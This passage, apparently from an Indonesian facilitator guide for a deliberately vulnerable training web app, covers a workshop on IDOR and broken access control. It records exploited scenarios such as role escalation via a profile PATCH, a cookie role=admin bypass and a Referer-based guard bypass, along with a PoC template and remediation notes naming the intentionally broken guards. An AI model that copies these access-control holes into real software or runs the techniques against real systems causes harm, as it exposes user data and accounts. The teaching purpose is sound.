Tidak ada endpoint reset HTTP. Jangan menambahkan satu pun untuk kenyamanan:
reset via restart adalah bagian dari desain.


## 15. Verifikasi yang sudah dilakukan

Verifikasi dilakukan pada build ini, Node 24.22.0, server lokal, dengan akun
baru `auditor01` (customer) kecuali disebut lain:

| Skenario | Hasil yang diamati |
|---|---|
| A1/A2 | `GET` profil bob/admin `200` dengan email/telepon |
| A3 | `PATCH /api/users/me` role admin `200`; endpoint admin ikut `200` |
| A4 | cookie `role=admin` membuka dan mengubah settings |
| K1 | alamat 3002 dibaca/diubah `200`; order 5002 memakai alamat baru |
| B1 | order 5002 `200` dengan data bob |
| B2 | `PATCH` order 5002 `200`; status berubah |
| B3 | `/api/orders` kosong; `/api/admin/orders` `200` semua order |
| C1/C2 | invoice JSON dan PDF 7002 `200`; PDF memuat bob |
| C3 | `/api/company/invoices` tanpa token `200` |
| D1/D2 | tiket 4002 dan alias `200`, termasuk `internalNotes` |
| D3 | POST balasan tiket `404`; tidak ada state baru |
| E1/E2 | daftar 7 user `200`; hapus dian `204`; sisa 6 |
| E3 | request role `201`; approve sendiri `200`; role admin |
| E4 | daftar role request `200` |
| E5 | PATCH status user `404` |
| E6 | POST + override `404` |
| F1/F2 | stats `200`; semua order + email/telepon `200` |
| F3 | `/admin` `200`; API users `200` untuk customer |
| F4 | tanpa Referer `403`; dengan Referer `/admin` `200` CSV |
| F5 | audit-log `403` untuk customer; `200` setelah eskalasi |
| G1/G2 | metadata dan file dokumen partner `200` |
| G3 | Intruder 1–3 `200`; 4–10 `404` (sebelum upload) |
| G4 | upload ke folder 1 `201`; dokumen owner attacker |
| H1/H2/H3 | direktori, artikel + profil, dan GUID `200` tanpa token |
| I1 | cookie seller `200`; produk baru `201` dengan sellerId attacker |
| I2/I3 | update produk 8002 `200`; delete 106 `204` |
| J1 | checkout dengan alamat 3002 `201`; order memakai alamat bob |

**Batasan verifikasi:** interaksi Burp Suite dan browser peserta tidak
dijalankan otomatis di dokumen ini; request HTTP di atas diverifikasi lewat
server lokal dan klien HTTP. Paket portable Windows tidak diuji di lingkungan
ini. Pemetaan slide 45/33 mengikuti asumsi di awal; sesuaikan dengan deck Anda.

---

## 16. Susunan sesi yang disarankan

| Waktu | Segmen | Skenario |
|---|---|---|
| 10 menit | Demo 02 — recon | F3, H1, C3, D2, audit-log F5 |
| 20 menit | Demo 03 — IDOR horizontal | A1, A2, K1, B1, B2, C1, C2, D1, G1–G4, H2/H3, J1 |
| 20 menit | Demo 04 — vertical | A3, A4, E1–E4, F1–F4, I1–I3 |
| 15 menit | Hands-on | Pilih 4–6 skenario; peserta mengisi template PoC |
| 10 menit | Remediation | `docs/remediation.md`, guard `authz.js`, diskusi |

Saat demo, selalu tunjukkan **expected vs actual**, bukan hanya status `200`.
Untuk skenario yang mengubah state, restart sebelum lanjut agar audiens tidak
mengejar effects dari skenario sebelumnya.

---

## 17. Template PoC untuk fasilitator

```markdown
### Judul
Request:
```http
GET /api/... HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <token attacker>
```

Response:
`200` (atau `204`), body: ...

Expected:
`403` karena ...

Actual:
`200` dengan data/aksi ...

Impact:
Data/aksi spesifik yang berhasil, tanpa generalisasi severity.
```

Jangan menulis “critical” atau “full account takeover” jika yang terbukti
hanya membaca satu objek. Sebutkan objek, field, dan aksi yang benar-benar
terjadi.

---

## 18. Catatan remediation singkat

Perbaikan utama ada di `server/authz.js`:

- `requireRole` harus memeriksa `req.user.role`, bukan `next()` tanpa syarat.
- `ownerOnly` harus memanggil `resolveOwnerId(req)` dan membandingkannya dengan
  `req.user.id`; admin hanya jika diizinkan.
- `requireCookieRole` dan `refererGuard` tidak boleh menjadi kontrol akses;
  ganti dengan role dari token.
- `PATCH /api/users/me` harus memakai `pickAllowedFields('name','email','phone')`;
  `role` tidak pernah masuk patch.
- Endpoint admin (`users`, `orders`, `stats`, `reports/export`, role-change)
  harus memakai `requireRoleStrict('admin')`.
- `POST /api/documents` harus memvalidasi `folder.ownerId === req.user.id`.
- Checkout harus memvalidasi `address.userId === req.user.id`.
- `/api/employees` dan `/api/company/invoices` harus memakai `requireAuth` +
  role yang sesuai; artikel hanya mengirim field publik.

Snippet VULNERABLE vs SECURE ada di
[`docs/remediation.md`](remediation.md). Kontrol negatif
`/api/admin/audit-log` sengaja tetap memakai `requireRoleStrict('admin')` dan
harus terus begitu.

---

**Akhir dokumen.**
